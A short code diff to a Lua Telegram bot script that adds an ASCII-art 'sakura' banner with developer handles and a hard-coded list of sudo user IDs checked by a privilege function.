@@ -137,6 +137,11 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
+_             
+ ___  __ _| | ___   _ _ __ __ _ 
+/ __|/ _` | |/ / | | | '__/ _` |
+\__ \ (_| |   <| |_| | | | (_| |
+|___/\__,_|_|\_\\__,_|_|  \__,_|
 > CH › @sakurav15
 ~> DEVELOPER › @MMLMMM
 ]])
@@ -166,6 +171,7 @@ print(serpent.block(value, {comment=false}))
 end 
 function dl_cb(t,s)
 end
+sudo_users = {SUDO,1696477971,1052745572}
 function SudoBot(msg)  
 local SAKURA = false  
 for k,v in pairs(sudo_users) do  
